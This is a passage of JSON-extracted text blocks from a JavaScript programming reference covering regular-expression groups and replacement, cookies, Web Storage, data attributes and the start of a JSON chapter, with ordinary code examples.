        "font_size": 10,
        "img": []
    },
    {
        "text": "that is of interest, so the solution is to write a capture group  ( pattern ) . The captured data can then be referenced as... String replacement  \"$n\"  where  n  is the  n th  capture group (starting from  1 ) The  n th  argument in a callback function If the  RegExp  is not \ufb02agged  g , the  n+1 th  item in a returned  str. match   Array If the  RegExp  is \ufb02agged  g ,  str. match  discards captures, use  re. exec  instead Say there is a  String  where all  +  signs need to be replaced with a space, but only if they follow a letter character. This means a simple match would include that letter character and it would also be removed. Capturing it is the solution as it means the matched letter can be preserved.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  str  =   \"aa+b+cc+1+2\" ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    re  =   /([a-z])\\+/g ; // String replacement",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "str. replace ( re ,   '$1 ' );   // \"aa b cc 1+2\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Function replacement",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "str. replace ( re ,   ( m ,  $1 )   =>  $1  +   ' ' );   // \"aa b cc 1+2\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Non-Capture",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Using the form  (?: pattern ) , these work in a similar way to capture groups, except they do not store the contents of the group after the match. They can be particularly useful if other data is being captured which you don't want to move the indices of, but need to do some advanced pattern matching such as an OR",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  str  =   \"aa+b+cc+1+2\" ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    re  =   /(?:\\b|c)([a-z])\\+/g ;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "str. replace ( re ,   '$1 ' );   // \"aa+b c 1+2\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Look-Ahead",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If the desired match relies on something which follows it, rather than matching that and capturing it, it is possible to use a look-ahead to test for it but not include it in the match. A positive look-ahead has the form  (?= pattern ) , a negative look-ahead (where the expression match only happens if the look-ahead pattern did not match) has the",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "form  (?! pattern ) let  str  =   \"aa+b+cc+1+2\" ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    re  =   /\\+(?=[a-z])/g ;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "str. replace ( re ,   ' ' );   // \"aa b cc+1+2\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 31.7: Replacing string match with a callback function",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "String#replace  can have a function as its second argument so you can provide a replacement based on some logic.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"Some string Some\" . replace ( /Some/g ,   ( match ,  startIndex ,  wholeString )   =>   {    if ( startIndex  ==   0 ){      return   'Start' ;    }   else   {      return   'End' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 226    } });",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// will return Start string End",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "One line template library",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  data  =   { name :   'John' ,  surname :   'Doe' } \"My name is {surname}, {name} {surname}\" . replace ( /(?:{(.+?)})/g ,  x  =>  data [ x. slice ( 1 ,- 1 )]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// \"My name is Doe, John Doe\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 31.8: Using Regex.exec() with parentheses regex to extract matches of a string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Sometimes you doesn't want to simply replace or remove the string. Sometimes you want to extract and process matches. Here an example of how you manipulate matches. What is a match ? When a compatible substring is found for the entire regex in the string, the exec command produce a match. A match is an array compose by \ufb01rstly the whole substring that matched and all the parenthesis in the match. Imagine a html string :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<html> <head></head> <body>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   <h1> Example </h1>    <p> Look at this great link :  <a   href = \"http://goalkicker.com\" > goalkicker </a> http://anotherlinkoutsideatag </p>   Copyright  <a   href = \"https://stackoverflow.com\" > Stackoverflow </a>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</body>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You want to extract and get all the links inside an  a  tag. At \ufb01rst, here the regex you write :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   /<a[^>]*href=\"https?:\\/\\/.*\"[^>]*>[^<]*<\\/a>/g ;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "But now, imagine you want the  href  and the  anchor  of each link. And you want it together. You can simply add a new regex in for each match  OR  you can use parentheses :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  re  =   /<a[^>]*href=\"(https?:\\/\\/.*)\"[^>]*>([^<]*)<\\/a>/g ;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  str  =   '<html> \\n     <head></head> \\n     <body> \\n         <h1>Example</h1> \\n         <p>Look at this great link: <a href=\"http://goalkicker.com\">goalkicker</a> http://anotherlinkoutsideatag</p> \\n\\n         Copyright <a href=\"https://stackoverflow.com\">Stackoverflow</a> \\n     </body> \\' ; \\n ' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  m ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  links  =   []; while  (( m  =  re. exec ( str ))   !==   null )   {      if   ( m. index   ===  re. lastIndex )   {         re. lastIndex ++;      }     console. log ( m [ 0 ]);   // The all substring     console. log ( m [ 1 ]);   // The href subpart     console. log ( m [ 2 ]);   // The anchor subpart     links. push ({       match  :  m [ 0 ],     // the entire match",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      href  :  m [ 1 ],      // the first parenthesis => (https?:\\/\\/.*)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 227",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "      anchor  :  m [ 2 ],    // the second one => ([^<]*)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "At the end of the loop, you have an array of link with  anchor  and  href  and you can use it to write markdown for example :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "links. forEach ( function ( link )   {   console. log ( '[%s](%s)' ,  link. anchor ,  link. href ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To go further : Nested parenthesis",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 228",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 32: Cookies",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 32.1: Test if cookies are enabled",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If you want to make sure cookies are enabled before using them, you can use  navigator. cookieEnabled :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( navigator. cookieEnabled   ===   false ) {     alert ( \"Error: cookies not enabled!\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that on older browsers  navigator. cookieEnabled  may not exist and be unde\ufb01ned. In those cases you won't detect that cookies are not enabled.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 32.2: Adding and Setting Cookies",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The following variables set up the below example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  COOKIE_NAME  =   \"Example Cookie\" ;      /* The cookie's name. */ var  COOKIE_VALUE  =   \"Hello, world!\" ;      /* The cookie's value. */ var  COOKIE_PATH  =   \"/foo/bar\" ;            /* The cookie's path. */",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  COOKIE_EXPIRES ;                      /* The cookie's expiration date (config'd below). */ /* Set the cookie expiration to 1 minute in future (60000ms = 1 minute). */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "COOKIE_EXPIRES  =   ( new  Date ( Date. now ()   +   60000 )) . toUTCString (); document. cookie   +=   COOKIE_NAME  +   \"=\"   +  COOKIE_VALUE    +   \"; expires=\"   +  COOKIE_EXPIRES    +   \"; path=\"   +  COOKIE_PATH ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 32.3: Reading cookies",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  name  =  name  +   \"=\" ,     cookie_array  =  document. cookie . split ( ';' ),     cookie_value ; for ( var  i = 0 ; i < cookie_array. length ; i ++)   {      var  cookie = cookie_array [ i ];     while ( cookie. charAt ( 0 )== ' ' )         cookie  =  cookie. substring ( 1 , cookie. length );      if ( cookie. indexOf ( name )== 0 )         cookie_value  =  cookie. substring ( name. length , cookie. length );      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will set  cookie_value  to the value of the cookie, if it exists. If the cookie is not set, it will set  cookie_value  to null",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 32.4: Removing cookies",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  expiry  =   new  Date (); expiry. setTime ( expiry. getTime ()   -   3600 ); document. cookie   =  name  +   \"=; expires=\"   +  expiry. toGMTString ()   +   \"; path=/\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will remove the cookie with a given  name .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 229",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 33: Web Storage",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Description name",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The key/name of the item",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "value",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The value of the item",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.1: Using localStorage",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The localStorage object provides persistent (but not permanent - see limits below) key-value storage of strings. Any changes are immediately visible in all other windows/frames from the same origin. The stored values persistent inde\ufb01nitely unless the user clears saved data or con\ufb01gures an expiration limit. localStorage uses a map-like interface for getting and setting values.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "localStorage. setItem ( 'name' ,   \"John Smith\" ); console. log ( localStorage. getItem ( 'name' ));   // \"John Smith\" localStorage. removeItem ( 'name' ); console. log ( localStorage. getItem ( 'name' ));   // null",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you want to store simple structured data, you can use JSON to serialize it to and from strings for storage.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  players  =   [{ name :   \"Tyler\" ,  score :   22 },   { name :   \"Ryan\" ,  score :   41 }]; localStorage. setItem ( 'players' ,  JSON. stringify ( players )); console. log ( JSON. parse ( localStorage. getItem ( 'players' )));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// [ Object { name: \"Tyler\", score: 22 }, Object { name: \"Ryan\", score: 41 } ]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "localStorage limits in browsers",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Mobile browsers:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Browser Google Chrome Android Browser Firefox iOS Safari",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version 40 4.3 34 6-8 Space available 10MB 2MB 10MB 5MB Desktop browsers:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Browser Google Chrome Opera Firefox Safari Internet Explorer",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version 40 27 34 6-8 9-11 Space available 10MB 10MB 10MB 5MB 10MB",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.2: Simpler way of handling Storage",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "localStorage ,  sessionStorage  are JavaScript  Objects  and you can treat them as such. Instead of using Storage Methods like  . getItem () ,  . setItem () , etc \u2026  here's a simpler alternative:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Set localStorage. greet   =   \"Hi!\" ;   // Same as: window.localStorage.setItem(\"greet\", \"Hi!\"); // Get localStorage. greet ;           // Same as: window.localStorage.getItem(\"greet\"); // Remove item delete  localStorage. greet ;    // Same as: window.localStorage.removeItem(\"greet\");",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 230",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Clear storage",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "localStorage. clear ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Store values (Strings, Numbers)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "localStorage. hello   =   \"Hello\" ; localStorage. year    =   2017 ;     ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Store complex data (Objects, Arrays)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  user  =   { name : \"John\" ,  surname : \"Doe\" ,  books :[ \"A\" , \"B\" ]}; localStorage. user   =  JSON. stringify (  user  );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Important: Numbers are stored as String",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log (   typeof  localStorage. year   );   // String",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Retrieve values",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  someYear  =  localStorage. year ;   // \"2017\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Retrieve complex data",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  userData  =  JSON. parse (  localStorage. user   ); var  userName  =  userData. name ;   // \"John\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Remove specific data",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "delete  localStorage. year ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Clear (delete) all stored data",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "localStorage. clear ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 33.3: Storage events",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Whenever a value in set in localStorage, a  storage  event will be dispatched on all other  windows  from the same origin. This can be used to synchronize state between di\ufb00erent pages without reloading or communicating with a server. For example, we can re\ufb02ect the value of an input element as paragraph text in another window: First Window",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  input  =  document. createElement ( 'input' ); document. body . appendChild ( input ); input. value   =  localStorage. getItem ( 'user-value' ); input. oninput   =   function ( event )   {   localStorage. setItem ( 'user-value' ,  input. value ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Second Window",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  output  =  document. createElement ( 'p' ); document. body . appendChild ( output ); output. textContent   =  localStorage. getItem ( 'user-value' ); window. addEventListener ( 'storage' ,   function ( event )   {    if   ( event. key   ===   'user-value' )   {     output. textContent   =  event. newValue ;    } });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Notes",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 231",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Event is not \ufb01red or catchable under Chrome, Edge and Safari if domain was modi\ufb01ed through script. First window",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// page url: http://sub.a.com/1.html",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "document. domain   =   'a.com' ; var  input  =  document. createElement ( 'input' ); document. body . appendChild ( input ); input. value   =  localStorage. getItem ( 'user-value' ); input. oninput   =   function ( event )   {   localStorage. setItem ( 'user-value' ,  input. value ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Second Window",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// page url: http://sub.a.com/2.html",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "document. domain   =   'a.com' ; var  output  =  document. createElement ( 'p' ); document. body . appendChild ( output );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Listener will never called under Chrome(53), Edge and Safari(10.0).",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "window. addEventListener ( 'storage' ,   function ( event )   {    if   ( event. key   ===   'user-value' )   {     output. textContent   =  event. newValue ;    } });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 33.4: sessionStorage",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The sessionStorage object implements the same Storage interface as localStorage. However, instead of being shared with all pages from the same origin, sessionStorage data is stored separately for every window/tab. Stored data persists between pages  in that window/tab  for as long as it's open, but is visible nowhere else.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  audio  =  document. querySelector ( 'audio' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Maintain the volume if the user clicks a link then navigates back here.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "audio. volume   =  Number ( sessionStorage. getItem ( 'volume' )   ||   1.0 ); audio. onvolumechange   =   function ( event )   {   sessionStorage. setItem ( 'volume' ,  audio. volume ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Save data to sessionStorage",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "sessionStorage. setItem ( 'key' ,   'value' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Get saved data from sessionStorage",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  data  =  sessionStorage. getItem ( 'key' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Remove saved data from sessionStorage",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "sessionStorage. removeItem ( 'key' )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 232",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.5: localStorage length",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "localStorage. length  property returns an integer number indicating the number of elements in the  localStorage Example: Set Items",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "localStorage. setItem ( 'StackOverflow' ,   'Documentation' ); localStorage. setItem ( 'font' ,   'Helvetica' ); localStorage. setItem ( 'image' ,   'sprite.svg' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Get length",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "localStorage. length ;   // 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 33.6: Error conditions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Most browsers, when con\ufb01gured to block cookies, will also block  localStorage . Attempts to use it will result in an exception. Do not forget to manage these cases.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  video  =  document. querySelector ( 'video' )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "try   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    video. volume   =  localStorage. getItem ( 'volume' ) }   catch   ( error )   {     alert ( 'If you \\' d like your volume saved, turn on cookies' ) } video. play ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If error were not handled, program would stop functioning properly.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.7: Clearing storage",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To clear the storage, simply run",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "localStorage. clear ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 33.8: Remove Storage Item",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To remove a speci\ufb01c item from the browser Storage (the opposite of  setItem ) use  removeItem",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "localStorage. removeItem ( \"greet\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "localStorage. setItem ( \"greet\" ,   \"hi\" ); localStorage. removeItem ( \"greet\" ); console. log (  localStorage. getItem ( \"greet\" )   );   // null",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "(Same applies for  sessionStorage )",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 233",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 34: Data attributes",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 34.1: Accessing data attributes",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Using the dataset property",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The new  dataset  property allows access (for both reading and writing) to all data attributes  data -*  on any element.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<p> Countries: </p> <ul>    <li   id = \"C1\"   onclick = \"showDetails(this)\"   data-id = \"US\"   data-dial-code = \"1\" > USA </li>    <li   id = \"C2\"   onclick = \"showDetails(this)\"   data-id = \"CA\"   data-dial-code = \"1\" > Canada </li>    <li   id = \"C3\"   onclick = \"showDetails(this)\"   data-id = \"FF\"   data-dial-code = \"3\" > France </li>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</ul>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<button   type = \"button\"   onclick = \"correctDetails()\" > Correct Country Details </button>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function showDetails(item) {     var msg = item.innerHTML             + \"\\r\\nISO ID: \" + item.dataset.id             + \"\\r\\nDial Code: \" + item.dataset.dialCode;     alert(msg); } function correctDetails(item) {     var item = document.getEmementById(\"C3\");     item.dataset.id = \"FR\";     item.dataset.dialCode = \"33\"; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note: The  dataset  property is only supported in modern browsers and it's slightly slower than the  getAttribute and  setAttribute  methods which are supported by all browsers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Using the getAttribute & setAttribute methods",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If you want to support the older browsers before HTML5, you can use the  getAttribute  and  setAttribute methods which are used to access any attribute including the data attributes. The two functions in the example above can be written this way:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function showDetails(item) {     var msg = item.innerHTML             + \"\\r\\nISO ID: \" + item.getAttribute(\"data-id\")             + \"\\r\\nDial Code: \" + item.getAttribute(\"data-dial-code\");     alert(msg); } function correctDetails(item) {     var item = document.getEmementById(\"C3\");     item.setAttribute(\"id\", \"FR\");     item.setAttribute(\"data-dial-code\", \"33\"); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 234",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 35: JSON",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details JSON.parse Parse a JSON string",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "input ( string )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "JSON string to be parsed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "reviver ( function )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Prescribes a transformation for the input JSON string.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "JSON.stringify Serialize a serializable value",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "value ( string )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Value to be serialized according to the JSON speci\ufb01cation.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "replacer ( function  or  String []  or Number [])",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Selectively includes certain properties of the  value  object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "space ( String  or  Number )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
